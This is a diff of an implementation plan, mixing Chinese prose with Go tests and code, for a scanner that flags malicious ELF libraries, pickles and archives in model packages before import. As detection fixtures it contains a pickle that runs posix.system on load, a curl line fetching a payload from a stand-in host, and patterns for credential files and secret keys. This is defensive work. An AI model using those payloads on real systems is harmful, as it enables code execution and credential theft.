+> **第三点，也是这三条里唯一一条会把结论翻面的：一个文件抽取失败时，它是被记成 `Incomplete`，不是被静默跳过。** 这条链要写全，因为它是本通道 fail-closed 的承重结构，而它同时跨了三个任务，单看任何一个任务的代码都看不出全貌：抽取函数（本步的 `collectArchive`、Task 5 的 `collectELF`、`collectCompressed` 等）在打不开容器/解析不了 ELF 时**返回 error**，而不是 `markStructural` 后继续——返回是刻意的，`markStructural` 记的是"这个文件读了但没读全"，而这里的事实是"这个文件根本没读成"，两者在报告里必须能分开；Task 7 的 `CollectEvidence` 把它收进 `set.Err` 而不是往外抛（往外抛会被 `import_processing.go:642-660` 当成整趟失败而拒绝这次导入，报告连原因都来不及写；删包那一动作已由 Task 11a 移除，但错误路径仍会在报告生成之前返回）；Task 9 的 `ScanDirectory` 在 `if set.Err != nil` 分支里 `res.Summary.Incomplete++; return nil`——自增之后 `return nil`，所以这一个文件不会中断其余文件的扫描，但它**已经**被计数了。`Incomplete` 随后折进 `Report.Binary`，`ProvesCleanScan` 在 `b.Incomplete > 0` 时返回 false（`{"an unexamined file withholds", BinaryScanSummary{FilesCount: 3, Incomplete: 1}, false}`），于是导入被扣下。
+>
+> 所以判据是：**"抽取出错"与"被跳过"在报告里绝不能长得一样**。跳过是 `classify` 判定为非二进制（非常规文件、文本文件、非 ELF/pickle 的成员），它不计数，因为那不是一次失败的查看；抽取出错是一次失败的查看，它必须计数。宿主上有一个现成的形状能测这条链：**21 个被截断的 CUDA/MLX 库，全部落在 `teellm/models/ollama/lib/ollama/` 下**（`cuda_v12` 3 个、`cuda_v13` 3 个、`mlx_cuda_v13` 14 个、`vulkan` 1 个）——其中 20 个在磁盘上正好 10485760 字节（10 MiB），第 21 个 `vulkan/libggml-vulkan.so` 是 10747904 字节，而 ELF 头把节头表指向 **34483600–751773392 字节（约 33–717 MB）**的偏移，于是 `elf.NewFile` 直接返回 `EOF`。**`deploy/guest-build/semgrep-payload/rootfs` 不在这 21 个里面**：它下面有 88 个 `.so*`，但截断的一个也没有（常被引用的"约 116 MB"只是 `cuda_v12/libcublas.so.12.8.5.5` 这一个样本）。它们今天不在任何模型包里，但只要有一个出现在包里，被截断的库就是"抽取出错"而不是"跳过"，`Incomplete` 必须是 1，包必须被扣下——这正是 `TestBinaryScannerCountsAnUnreadableFileAsIncomplete` 那一族要钉住的形状，也是它不能只测 `classify` 失败那条分支的原因。
 
 ---
 
@@ -2471,11 +5838,18 @@ func TestCollectEvidenceRoutesByKind(t *testing.T) {
 		file string
 		raw  []byte
 		want BinaryKind
+		// wantSource is the evidence source only the dedicated collector for
+		// this kind produces. It is asserted rather than implied by a non-empty
+		// listing because the shared strings pass emits "connect" from an ELF
+		// and "system" from a pickle just as readily as the collectors do, so
+		// presence alone stays green when a kind is misrouted into that pass -
+		// which is the loss this channel exists to prevent.
+		wantSource EvidenceSource
 	}{
-		{"elf", "lib.so", elfFixtureBytes(t, elfSpec{imports: []string{"connect"}}), KindELF},
-		{"archive", "m.pt", zipFixture(t, map[string][]byte{"a": []byte("x")}, []string{"a"}), KindArchive},
-		{"pickle", "m.pkl", []byte("\x80\x04cposix\nsystem\n."), KindPickle},
-		{"raw", "w.bin", []byte("data\x00literal_here"), KindRaw},
+		{"elf", "lib.so", elfFixtureBytes(t, elfSpec{imports: []string{"connect"}}), KindELF, SourceDynsym},
+		{"archive", "m.pt", zipFixture(t, map[string][]byte{"a": []byte("x")}, []string{"a"}), KindArchive, SourceMember},
+		{"pickle", "m.pkl", []byte("\x80\x04cposix\nsystem\n."), KindPickle, SourcePickle},
+		{"raw", "w.bin", []byte("data\x00literal_here"), KindRaw, SourceStrings},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -2486,6 +5860,23 @@ func TestCollectEvidenceRoutesByKind(t *testing.T) {
 			}
 			if len(set.Lines) == 0 {
 				t.Error("no evidence at all from a file that has some")
+			}
+			// The source is what pins the dispatch: SourceDynsym comes only
+			// from the ELF parse, SourceMember only from the zip walk and
+			// SourcePickle only from the interpreter, so a kind that never
+			// reached its collector cannot produce its line. KindRaw is the one
+			// case where the shared strings pass is the collector, so its
+			// expectation is SourceStrings and there is nothing stronger to
+			// assert.
+			found := false
+			for _, l := range set.Lines {
+				if l.Source == tc.wantSource {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Errorf("no %s evidence: the file never reached its %s collector", tc.wantSource, tc.want)
 			}
 			// Finalize assigns Index; nothing may read the listing before it.
 			for i, l := range set.Lines {
@@ -2503,28 +5894,32 @@ func TestCollectEvidenceRoutesByKind(t *testing.T) {
 	}
 }
 
-// TestCollectEvidenceRunsThePickleScanOnEveryStream pins the universal half of
-// the pickle rule: the scan is not restricted to files named or sniffed as
-// pickles, so a pickle appended to a tensor blob - a shape whose head carries no
-// pickle magic - is still read as what it is.
-func TestCollectEvidenceRunsThePickleScanOnEveryStream(t *testing.T) {
+// TestCollectEvidenceDoesNotInterpretNonPicklesAsPickles pins the reversal of
+// what this test used to assert. The plan previously ran the pickle scan on every
+// stream unconditionally, which was harmless only because that scan was a
+// byte-pattern match that never committed to a parse. The interpreter commits: it
+// either reads the bytes as opcodes or records that it could not, and an ELF's
+// first byte (\x7f) is not an opcode - so running it over a shared object would set
+// Bound.Structural, and because KindELF is an executable kind that bound withholds
+// a clean verdict and blocks the import. Every .so in every model package would be
+// blocked. The interpreter therefore runs only on a stream that is claimed to be a
+// pickle (Task 4's gate rule), and a non-pickle gets the strings pass alone.
+func TestCollectEvidenceDoesNotInterpretNonPicklesAsPickles(t *testing.T) {
 	dir := t.TempDir()
-	content := []byte("SAFETENSORS_HEADER\x00\x00\x00\x00")
-	content = append(content, []byte("\x80\x04cposix\nsystem\n.")...)
-	path := writeTestBytes(t, dir, "w.safetensors", content)
+	path := writeTestBytes(t, dir, "libkernel.so",
+		elfFixtureBytes(t, elfSpec{imports: []string{"connect"}}))
 
-	set := CollectEvidence(path, KindRaw, DefaultBinaryConfig())
+	set := CollectEvidence(path, KindELF, DefaultBinaryConfig())
 	if set.Err != nil {
 		t.Fatalf("CollectEvidence: %v", set.Err)
 	}
-	var pickles []string
+	if set.Bound.Structural {
+		t.Fatalf("an ELF tripped a structural bound (%s); the interpreter ran on a non-pickle", set.Bound.Reason)
+	}
 	for _, l := range set.Lines {
 		if l.Source == SourcePickle {
-			pickles = append(pickles, l.Text)
+			t.Errorf("pickle evidence %q produced from an ELF", l.Text)
 		}
-	}
-	if !containsString(pickles, "posix.system") {
-		t.Errorf("pickle evidence = %v, want [posix.system] from a file classified as raw", pickles)
 	}
 }
 
@@ -2588,8 +5983,11 @@ func TestCollectEvidenceWindowsAFileAboveTheSizeThreshold(t *testing.T) {
 					t.Error("the middle was read anyway; the threshold is not a threshold")
 				}
 			}
-			// isExecutableKind is what decides whether that bound blocks; this
-			// asserts the same predicate the scanner folds on.
+			// This last check is on the predicate itself, not on CollectEvidence:
+			// CollectEvidence never consults isExecutableKind, so this only
+			// keeps wantBlocked above honest against the table. What folds the
+			// predicate into a withheld verdict is the scanner's, and that
+			// arrives in Task 9.
 			if got := isExecutableKind(tc.kind); got != tc.wantBlocked {
 				t.Errorf("isExecutableKind(%s) = %t, want %t", tc.kind, got, tc.wantBlocked)
 			}
@@ -2597,6 +5995,8 @@ func TestCollectEvidenceWindowsAFileAboveTheSizeThreshold(t *testing.T) {
 	}
 }
 ```
+
+**关于 `pickle` 那一格的诚实说明**：加上 `wantSource` 之后，`elf`/`archive` 两格的派发是被**完全**钉住的——`SourceDynsym` 只可能来自 ELF 解析、`SourceMember` 只可能来自 zip 遍历，走岔了的 kind 产不出这一行。但 `pickle` 那一格只能钉到「解释器跑了」这一层：`CollectEvidence` 的 pickle 分支**就是**共享的 `streamWithSizeSwitch` 这一趟（见 Step 3 的 `case KindNumpy, KindPickle, KindRaw`），并不存在一个「专属的 pickle 抽取器」可供绕开，所以这一格证明的是 kind 被正确传进了那趟共享扫描、解释器随之开跑，而不是「路由到了一个别的实现」。`pickle`/`raw` 这一路上尺寸开关的残余风险由 `TestCollectEvidenceWindowsAFileAboveTheSizeThreshold` 接住——那条用例才是在钉超阈值后中间段被跳过这件事。这是派发结构本身的性质，不是这条测试的短板；写在这里，免得后来者对着这一格反复琢磨。
 
 - [ ] **Step 2: 跑测试确认失败**
 
@@ -2607,6 +6007,8 @@ go test ./internal/codeaudit/ -run TestCollectEvidence 2>&1 | head -10
 预期：编译失败，`undefined: CollectEvidence`。
 
 - **Step 3: 实现**
+
+本块只加 `CollectEvidence` 一个函数。它调用的 `streamWithSizeSwitch` 与 `streamHeadAndTail` **在 Task 6 定义**（Task 6 的 `collectELF` 薄封装要调 `streamWithSizeSwitch`，而 Go 没有前向声明，定义留在本任务会让 Task 6 停在 `undefined: streamWithSizeSwitch`）——这两个函数不要在这里重新加一遍。
 
 追加到 `binary_evidence.go`：
 
@@ -2620,10 +6022,16 @@ go test ./internal/codeaudit/ -run TestCollectEvidence 2>&1 | head -10
 //
 // An error is recorded on the set rather than returned, because the caller's
 // decision is not "abort" but "count this file as not examined" - and a file
-// that was not examined has to reach the report, not stop it.
+// that was not examined has to reach the report, not stop it. Concretely: the
+// scanner reads set.Err and increments BinaryScanSummary.Incomplete, which
+// ProvesCleanScan refuses on. So a file whose extraction failed is counted
+// Incomplete and withholds the pass; it is never silently skipped. The two must
+// not be interchangeable - "skipped" means classify said the file is not binary,
+// which is not a look that failed, while set.Err means the file is binary and
+// this scan could not read it.
 func CollectEvidence(path string, kind BinaryKind, cfg BinaryConfig) *EvidenceSet {
 	cfg = normalizeBinaryConfig(cfg)
-	set := &EvidenceSet{File: path, Kind: kind, seen: map[string]bool{}}
+	set := newEvidenceSet(path, kind, cfg)
 
 	if info, err := os.Stat(path); err == nil {
 		set.Size = info.Size()
@@ -2670,101 +6078,6 @@ func CollectEvidence(path string, kind BinaryKind, cfg BinaryConfig) *EvidenceSe
 	set.Finalize()
 	return set
 }
-
-// streamWithSizeSwitch streams a file end to end when it is small enough to be
-// worth it, and reads only its head and tail when it is not.
-//
-// The switch exists because the two costs are not comparable. A full pass costs
-// about 3 microseconds per kibibyte at the measured rate, which is nothing for
-// the 10.8 MiB pickle that is the largest such file in the example package and
-// nine seconds for a 3 GiB shard. Above MaxFullScanBytes the pass is replaced by
-// a HeadTailBytes window at each end.
-//
-// Skipping the middle is recorded, and how it is recorded is isExecutableKind's
-// existing asymmetry rather than a new rule: a windowed pickle or ELF leaves a
-// region of an executable format unread, so it is a structural bound and a clean
-// verdict is withheld; a windowed tensor blob is a data bound and is only
-// reported. Without the first half the threshold would be an evasion: padding a
-// pickle past 64 MiB would hide a mid-stream GLOBAL and still pass.
-//
-// What that gives up is stated in the plan's boundary section rather than hidden
-// here: for a raw blob the middle is tensor data no loader reads, so nothing
-// reachable is lost. For a pickle it is a real loss - a GLOBAL emitted in the
-// middle of a long data-building run would be missed - and the two windows are
-// the mitigation rather than a cure, covering the load-time call at the front and
-// the post-load action at the back. A deployment whose packages contain such a
-// file raises maxFullScanBytes rather than being silently exempted.
-func streamWithSizeSwitch(path string, set *EvidenceSet, cfg BinaryConfig) error {
-	if set.Size > cfg.MaxFullScanBytes {
-		set.markStructural(fmt.Sprintf("file is %d bytes, above MaxFullScanBytes %d: only the head and tail %d bytes were read",
-			set.Size, cfg.MaxFullScanBytes, cfg.HeadTailBytes))
-		return streamHeadAndTail(path, set, cfg)
-	}
-	return streamEvidence(path, set, cfg, cfg.MaxStreamBytes)
-}
-
-// streamHeadAndTail runs the byte extractors over the first and last
-// HeadTailBytes of a file.
-//
-// It is what makes an appended payload visible. A zip's directory lives at the
-// end of the file and describes only the members before it, so a pickle stapled
-// after the last member is inside no member and would otherwise be read by
-// nothing; the same reasoning covers a section appended past an ELF's last
-// section header.
-//
-// The window size is a parameter rather than a constant because two callers want
-// different ones: a container always reads its two ends, while a large blob reads
-// its ends only because it was too large to read whole.
-func streamHeadAndTail(path string, set *EvidenceSet, cfg BinaryConfig) error {
-	f, err := os.Open(path)
-	if err != nil {
-		return fmt.Errorf("open %s: %w", path, err)
-	}
-	defer f.Close()
-	info, err := f.Stat()
-	if err != nil {
-		return fmt.Errorf("stat %s: %w", path, err)
-	}
-
-	headTailBytes := cfg.HeadTailBytes
-	scanner := newStringScanner(set, cfg)
-	pickles := newPickleScanner(set)
-
-	head := make([]byte, headTailBytes)
-	n, err := f.ReadAt(head, 0)
-	if err != nil && err != io.EOF {
-		return fmt.Errorf("read %s: %w", path, err)
-	}
-	if _, err := scanner.Write(head[:n]); err != nil {
-		return err
-	}
-	if _, err := pickles.Write(head[:n]); err != nil {
-		return err
-	}
-
-	if info.Size() > headTailBytes {
-		tail := make([]byte, headTailBytes)
-		at := info.Size() - headTailBytes
-		n, err := f.ReadAt(tail, at)
-		if err != nil && err != io.EOF {
-			return fmt.Errorf("read %s: %w", path, err)
-		}
-		// The offsets are rebased so that a tail literal reports where it
-		// actually is: an offset that silently restarted at zero would make two
-		// different payloads report the same location.
-		scanner.at = at
-		pickles.at = at
-		if _, err := scanner.Write(tail[:n]); err != nil {
-			return err
-		}
-		if _, err := pickles.Write(tail[:n]); err != nil {
-			return err
-		}
-	}
-	scanner.Flush()
-	pickles.Flush()
-	return nil
-}
 ```
 
 - [ ] **Step 4: 跑测试确认通过**
@@ -2804,16 +6117,73 @@ import "testing"
 // a family both arms can report, the binary side must not carry its own severity.
 // The two arms disagreeing about how bad socket use is would make the audit's
 // verdict depend on which channel happened to notice.
+//
+// The severity comparison at the end is a consequence check, not the one that
+// does the work: NewBinaryMatcher resolves a shared id straight from
+// DefaultRules(), so for a borrowed id that comparison cannot fail on its own.
+// What can fail - and what this test is really for - is the shape a re-typed copy
+// arrives in, and there are two of them. Both are asserted over the tables rather
+// than over the resolved rules, because that is where a copy would live.
+//
+// Mutation to keep this honest: add `"NET_002": {ID: "NET_002", Severity:
+// SeverityMedium}` to binaryOnlyRules. Three assertions go red, across two
+// tests. In this test the "reuses a shared id" assertion fires on the injected
+// entry itself, and the "both borrowed and restated" branch of the family loop
+// fires on the NET_002 family, which is now in both tables. In the same file,
+// TestBinaryOnlyFamiliesDoNotCollide also fires: it walks DefaultRules() and
+// asks binaryOnlyRules about each id, which is exactly the collision the
+// injected entry creates. (An earlier version of this note said only one
+// assertion went red and that the collision test could not see the entry; both
+// claims were wrong.) What does stay green is the severity comparison at the
+// end - NewBinaryMatcher still resolves NET_002 from the shared table, so the
+// resolved severity does not move - and the pattern check, because the injected
+// entry carries no Patterns.
 func TestBinaryRulesBorrowSharedFamilies(t *testing.T) {
 	byID := map[string]Rule{}
 	for _, r := range DefaultRules() {
 		byID[r.ID] = r
 	}
-	binary, err := NewBinaryMatcher()
+
+	// A binary-only entry must not reuse a shared id, and must not carry the
+	// source arm's patterns. The second assertion is the pattern-text half of the
+	// same drift: a re-typed copy arrives by copy-pasting a DefaultRules() entry,
+	// and that entry has Patterns set, whereas a genuine binary-only rule never
+	// does - the patterns live on the family (see binaryFamily), because a Rule's
+	// Patterns are the source arm's matcher and the regex and semgrep engines must
+	// not carry patterns for text they never read.
+	for id, r := range binaryOnlyRules {
+		if _, ok := byID[id]; ok {
+			t.Errorf("binary-only rule %s reuses a shared id; DefaultRules() is the source of truth for that id, so this entry is dead - and any severity or pattern text it states can drift from the one that is used", id)
+		}
+		if len(r.Patterns) != 0 {
+			t.Errorf("binary-only rule %s carries %d source-arm patterns; binary patterns belong on the family, and a Rule that carries them is a copy of a DefaultRules() entry rather than a decision", id, len(r.Patterns))
+		}
+	}
+
+	matcher, err := NewBinaryMatcher()
 	if err != nil {
 		t.Fatalf("NewBinaryMatcher: %v", err)
 	}
-	for _, r := range binary.Rules() {
+
+	// Every family must be in exactly one table, and must have at least one
+	// pattern. A family with no patterns matches nothing and nothing else
+	// notices it: it resolves fine, it sits in Rules(), and it silently never
+	// fires - which is a family that has been dropped without a trace.
+	for _, fam := range binaryFamilies {
+		_, borrowed := byID[fam.ID]
+		_, stated := binaryOnlyRules[fam.ID]
+		switch {
+		case borrowed && stated:
+			t.Errorf("family %s is both borrowed from DefaultRules() and restated in binaryOnlyRules; leave it in one place", fam.ID)
+		case !borrowed && !stated:
+			t.Errorf("family %s is in neither DefaultRules() nor binaryOnlyRules", fam.ID)
+		}
+		if len(fam.Patterns) == 0 {
+			t.Errorf("family %s has no patterns: it can never match, and nothing else notices", fam.ID)
+		}
+	}
+
+	for _, r := range matcher.Rules() {
 		shared, ok := byID[r.ID]
 		if !ok {
 			continue // a binary-only family states its own severity, by design
@@ -2860,9 +6230,12 @@ func TestMatchEvidenceSymbolFamilies(t *testing.T) {
 		{SourcePickle, "subprocess.Popen", "PKL_001"},
 		{SourcePickle, "builtins.eval", "PKL_001"},
 		{SourceEntropy, "high-entropy-executable-section .text 7.94", "BIN_001"},
-		{SourceStrings, "/etc/passwd", "FIL_001"},
-		{SourceStrings, "/root/.ssh/id_rsa", "FIL_001"},
-		{SourceStrings, "(/etc/cron.d/backdoor)", "PER_001"},
+		{SourceStrings, "/bin/sh", "CMD_002"},
+		{SourceStrings, "curl -o /tmp/x http://evil.example/p", "CMD_002"},
+		{SourceStrings, "/etc/passwd", "FIL_002"},
+		{SourceStrings, "/root/.ssh/id_rsa", "FIL_002"},
+		{SourceStrings, "crontab -l", "PER_002"},
+		{SourceStrings, "AWS_SECRET_ACCESS_KEY", "ENV_002"},
 	}
 	for _, tc := range cases {
 		got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text})
@@ -2904,6 +6277,17 @@ func TestMatchEvidenceRejectsTheBenignNeighbours(t *testing.T) {
 		{SourceSection, ".text size=1048576 executable=true"},
 		{SourceMember, "archive/data.pkl size=1024"},
 		{SourceNotice, "interpreter /lib64/ld-linux-x86-64.so.2"},
+		// Each of these is a measured false positive of the previous table, kept
+		// here so a later widening has to argue with the evidence: `bind` on its
+		// own is a server, the two trailing runs are fragments of a concatenated
+		// string table rather than the paths they spell, and `private_key` is
+		// the lower-case identifier ENV_001 matched because it carries (?i) -
+		// ENV_002 drops the flag, and this line pins that the drop holds.
+		{SourceDynsym, "bind"},
+		{SourceStrings, ".profilez /etc/cron) crontabz"},
+		{SourceStrings, ".aws/credentialsz"},
+		{SourceStrings, ".ssh/id_rsaz"},
+		{SourceStrings, "private_key"},
 	}
 	for _, tc := range cases {
 		if got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text}); got != nil {
@@ -2926,15 +6310,216 @@ func TestSymbolRulesDoNotMatchStringLiterals(t *testing.T) {
 		}
 	}
 }
+
+// TestBinaryTableProducesNoHighFindingsOnLegitimateInputs is the bar the table
+// has to clear, and it is a bar rather than a preference. The severity column is
+// the only control that exists downstream: `Passed` is computed as
+// `highCount == 0` (with the medium count added under the `gate` policy), and a
+// `Passed` that comes out false makes `internal/controller/import_processing.go`
+// refuse the import and report the package as unsafe. The audit never writes to,
+// deletes, or modifies the package it reads, so a rule table that reports a HIGH
+// on an ordinary shared object or a compiled .pyc does not destroy anything - it
+// refuses a legitimate import and hands the operator a report that calls the
+// package dangerous.
+//
+// Every fixture below reproduces a shape measured against real files on this
+// machine: the string runs of `/home/hjy/taa/models` (740 files of that tree are
+// tracked in this repository, so it is not the untracked part - the narrower
+// truth is that the .pyc files carrying these fragments are the untracked,
+// gitignored ones, which is why the fragments are reproduced as fixtures rather
+// than the files being embedded), the 28 shared libraries of a stock ollama
+// install, and the .pyc files under this repository, using the stringScanner
+// semantics from binary_evidence.go, real `readelf --dyn-syms` output and real
+// pickle targets. The measured numbers the shapes stand for - 23 of 28 libraries
+// firing a free-string rule, `bind` in libllama-common.so, the TAB-bearing
+// `'.profilez\t/etc/cron)'` run in taint_engine.cpython-312.pyc and `crontabz` in
+// code_security_analyzer.cpython-312.pyc - are recorded in this task's prose so
+// a later reader can repeat the run against the finished table.
+func TestBinaryTableProducesNoHighFindingsOnLegitimateInputs(t *testing.T) {
+	matcher, err := NewBinaryMatcher()
+	if err != nil {
+		t.Fatal(err)
+	}
+	fixtures := []struct {
+		name  string
+		lines []EvidenceLine
+	}{
+		{"a 120-digit decimal run, as in libllama.so", []EvidenceLine{
+			{Source: SourceStrings, Text: "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879"},
+		}},
+		{"a 120-plus base64-alphabet run, as in a torch data.pkl", []EvidenceLine{
+			{Source: SourceStrings, Text: "zpssssssssrrrruuuuvstutsrqqpopotpprsssssssrrrrtuuutqrsrrpooommnnnmpqqqqabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"},
+		}},
+		{"a .pyc concatenated run holding crontab and /etc/cron mid-run", []EvidenceLine{
+			{Source: SourceStrings, Text: ".profilez /etc/cron) crontabz code_security_analyzer"},
+		}},
+		{"a dynsym listing with bind alone, as in libllama-common.so", []EvidenceLine{
+			{Source: SourceDynsym, Text: "bind"},
+		}},
+		{"a dynsym listing with dlopen and dlsym, as in libgomp.so", []EvidenceLine{
+			{Source: SourceDynsym, Text: "dlopen"},
+			{Source: SourceDynsym, Text: "dlsym"},
+		}},
+		// `API_KEY` matches ENV_002 and that is intended - it is a LOW, and the
+		// assertion below is about HIGH. The lower-case `private_key` sits here
+		// among legitimate identifiers and must not fire anything either; the
+		// no-match assertion itself lives in TestMatchEvidenceRejectsThe
+		// BenignNeighbours, and the two `...z` runs are the .pyc fragments.
+		{"a string run holding ordinary identifiers", []EvidenceLine{
+			{Source: SourceStrings, Text: "API_KEY"},
+			{Source: SourceStrings, Text: "private_key"},
+			{Source: SourceStrings, Text: ".aws/credentialsz"},
+			{Source: SourceStrings, Text: ".ssh/id_rsaz"},
+		}},
+		{"a legitimate kernel's imports", []EvidenceLine{
+			{Source: SourceDynsym, Text: "malloc"},
+			{Source: SourceDynsym, Text: "memcpy"},
+			{Source: SourceDynsym, Text: "pthread_create"},
+			{Source: SourceNeeded, Text: "libc.so.6"},
+			{Source: SourceNeeded, Text: "libm.so.6"},
+		}},
+	}
+	for _, fx := range fixtures {
+		t.Run(fx.name, func(t *testing.T) {
+			for _, line := range fx.lines {
+				if rule := matcher.Match(line); rule != nil && rule.Severity == SeverityHigh {
+					t.Errorf("%s %q produced the HIGH finding %s; a legitimate file must not be able to block the import",
+						line.Source, line.Text, rule.ID)
+				}
+			}
+		})
+	}
+}
+
+// TestBinaryTableStillFiresHighOnStructuralEvidence is the other direction, and
+// it is what keeps the test above from being vacuous: a table with no rules at
+// all would pass a test that only asserts silence. Every case here is evidence
+// the file's own construction produced - a committed pickle parse, a symbol or
+// library name the linker wrote, a measured executable-section entropy - and
+// each must stay HIGH, so a later recalibration that softens one of them fails
+// here rather than silently lowering the bar.
+func TestBinaryTableStillFiresHighOnStructuralEvidence(t *testing.T) {
+	matcher, err := NewBinaryMatcher()
+	if err != nil {
+		t.Fatal(err)
+	}
+	cases := []struct {
+		name string
+		line EvidenceLine
+		want string
+	}{
+		{"a pickle target that executes on load", EvidenceLine{Source: SourcePickle, Text: "posix.system"}, "PKL_001"},
+		{"a dynsym execve", EvidenceLine{Source: SourceDynsym, Text: "execve"}, "CMD_001"},
+		{"a dynsym memfd_create", EvidenceLine{Source: SourceDynsym, Text: "memfd_create"}, "BIN_002"},
+		{"a dynsym connect", EvidenceLine{Source: SourceDynsym, Text: "connect"}, "NET_002"},
+		{"a client library dependency", EvidenceLine{Source: SourceNeeded, Text: "libcurl.so.4"}, "NET_002"},
+		{"a high-entropy executable section", EvidenceLine{Source: SourceEntropy, Text: "high-entropy-executable-section .text 7.94"}, "BIN_001"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			rule := matcher.Match(tc.line)
+			if rule == nil {
+				t.Fatalf("no rule matched %s %q, want %s", tc.line.Source, tc.line.Text, tc.want)
+			}
+			if rule.ID != tc.want {
+				t.Errorf("%s %q matched %s, want %s", tc.line.Source, tc.line.Text, rule.ID, tc.want)
+			}
+			if rule.Severity != SeverityHigh {
+				t.Errorf("%s is %s; every rule in this test must stay HIGH, so a later downgrade breaks it",
+					rule.ID, rule.Severity)
+			}
+		})
+	}
+}
+
+// TestBinaryFamilySeveritiesArePinned pins the severity column of the resolved
+// table, one family at a time, because that column is the only control that
+// decides whether a finding blocks. Under the default `assist` policy `Passed`
+// is `highCount == 0`; under `gate` it is `High == 0 && Medium == 0`, and a
+// false `Passed` makes internal/controller/import_processing.go:655-660 delete
+// the package. The two
+// policies therefore impose two different bars, and a family's severity has to
+// be right for both: the four string families are LOW, not MEDIUM, precisely
+// because MEDIUM would still delete once an operator switches to `gate`.
+//
+// TestBinaryTableProducesNoHighFindingsOnLegitimateInputs asserts silence at
+// HIGH only, which is the `assist` bar; this test is the other half, and the
+// half that keeps a later edit from quietly moving a family to MEDIUM and
+// turning a warning into a re-import. It reads the rules the matcher resolved,
+// not the two tables, so it pins what the scanner will actually report however
+// the id was resolved.
+func TestBinaryFamilySeveritiesArePinned(t *testing.T) {
+	matcher, err := NewBinaryMatcher()
+	if err != nil {
+		t.Fatal(err)
+	}
+	resolved := map[string]Rule{}
+	for _, r := range matcher.Rules() {
+		resolved[r.ID] = r
+	}
+	cases := []struct {
+		id   string
+		want string
+	}{
+		// Structural evidence: the file's own construction produced it, so it
+		// may block, and it must keep doing so - a later softening is exactly
+		// what the test above cannot catch, because it only ever asserts
+		// silence.
+		{"BIN_001", SeverityHigh},
+		{"BIN_002", SeverityHigh},
+		{"PKL_001", SeverityHigh},
+		{"NET_002", SeverityHigh},
+		{"CMD_001", SeverityHigh},
+		// Borrowed and deliberate: MEDIUM does not block under `assist`, but it
+		// does under `gate`, so this value is load-bearing too.
+		{"DYN_001", SeverityMedium},
+		// String evidence must not block under either policy. LOW, and not
+		// MEDIUM, because MEDIUM alone refuses the import once the operator
+		// switches to `gate`. rules.go defines no SeverityLow constant, so the
+		// table writes the string and this test matches it.
+		{"CMD_002", "LOW"},
+		{"PER_002", "LOW"},
+		{"FIL_002", "LOW"},
+		{"ENV_002", "LOW"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.id, func(t *testing.T) {
+			r, ok := resolved[tc.id]
+			if !ok {
+				t.Fatalf("%s is not in the resolved table at all", tc.id)
+			}
+			if r.Severity != tc.want {
+				t.Errorf("%s is %s, want %s", tc.id, r.Severity, tc.want)
+			}
+		})
+	}
+	if len(cases) != len(matcher.Rules()) {
+		t.Errorf("this test pins %d families but the table resolves %d: a new family has to have its severity pinned here too, or nothing notices when it is set to a level that blocks",
+			len(cases), len(matcher.Rules()))
+	}
+}
+
+// TestEveryBinaryRuleHasASuggestion pins that the suggestion map covers the
+// binary table. It is written against BinaryRuleIDs rather than a literal list so
+// that a family added later fails here instead of shipping a report whose
+// recommendation for it says nothing.
+func TestEveryBinaryRuleHasASuggestion(t *testing.T) {
+	const fallback = "审查该代码片段并确认其安全性"
+	for _, id := range BinaryRuleIDs() {
+		if SuggestionForRule(id) == fallback {
+			t.Errorf("rule %s has no entry in ruleSuggestionMap", id)
+		}
+	}
+}
 ```
 
 - [ ] **Step 2: 跑测试确认失败**
 
 ```bash
-go test ./internal/codeaudit/ -run 'TestBinaryRules|TestBinaryOnly|TestMatchEvidence|TestSymbolRules' 2>&1 | head -10
+go test ./internal/codeaudit/ -run 'TestBinaryRules|TestBinaryOnly|TestBinaryFamily|TestBinaryTable|TestMatchEvidence|TestSymbolRules' 2>&1 | head -10
 ```
 
-预期：编译失败，`undefined: NewBinaryMatcher`。
+预期：编译失败。首屏会同时报 `undefined: NewBinaryMatcher`、`undefined: binaryOnlyRules` 和 `undefined: binaryFamilies`（这一版三个都还没写）——不用管顺序，是编译不过就对了。
 
 - [ ] **Step 3: 实现**
 
@@ -2953,12 +6538,52 @@ import (
 // own severity because there is no source-side rule with the same id to borrow
 // it from; every rule id that does exist in DefaultRules() is looked up there
 // instead, so the two channels cannot disagree about a shared family's severity.
+//
+// The severity column is policy, and the policy this table encodes is one
+// sentence: a finding may be HIGH only when it is corroborated by structure the
+// file cannot produce by accident. A dynamic symbol table entry, a DT_NEEDED
+// name, a committed pickle parse and a measured executable-section entropy are
+// all produced by the file's own construction. A free string is not: a .so
+// contains whatever text its authors embedded, and a .pyc's constants
+// concatenate into runs that contain anything, so a string match is evidence for
+// a reader and for the Tier-2 model rather than a verdict on its own.
+//
+// The reason this has to be stated rather than felt is that the severity column
+// is the only control that exists downstream. `Passed` is computed as
+// `highCount == 0` under the default `assist` policy, and with the medium count
+// added under `gate`, both in ComputeConclusionContext. A `Passed` that comes
+// out false refuses the import (internal/controller/import_processing.go) and
+// reports the package as unsafe; it deletes nothing, because the audit never
+// writes to, deletes, or modifies the package it reads. Measured against the
+// real files on this machine, the table as first written refused legitimate
+// packages: one free-string rule fired on 23 of 28 legitimate shared libraries.
+// That is why the four string-evidence families below live under new ids at LOW
+// rather than borrowing the source arm's severity - the source arm's rules match
+// Python source, where a literal in a call is a different fact from a byte run
+// in a binary.
+//
+// "LOW" is the literal the report path already uses for a non-blocking finding:
+// DefaultRules() has no LOW constant, and ClassifyFindingRisk falls through to
+// "LOW" for any severity that is neither HIGH nor MEDIUM. A LOW finding still
+// reaches the report and still goes to the Tier-2 verifier, which can raise it
+// to MALICIOUS on its own evidence; it simply does not block by itself.
 var binaryOnlyRules = map[string]Rule{
 	"BIN_001": {
 		ID:       "BIN_001",
 		Category: "加壳载荷",
-		Severity: SeverityMedium,
-		Description: "可执行节区或整个文件熵接近随机 — 代码已被压缩或加密，运行前必须先解包",
+		// HIGH, not MEDIUM: the reading is a measurement rather than a pattern -
+		// an executable section that measures near eight bits per byte has been
+		// compressed or encrypted and something must unpack it before it runs -
+		// and packing is exactly what this channel exists to catch. The
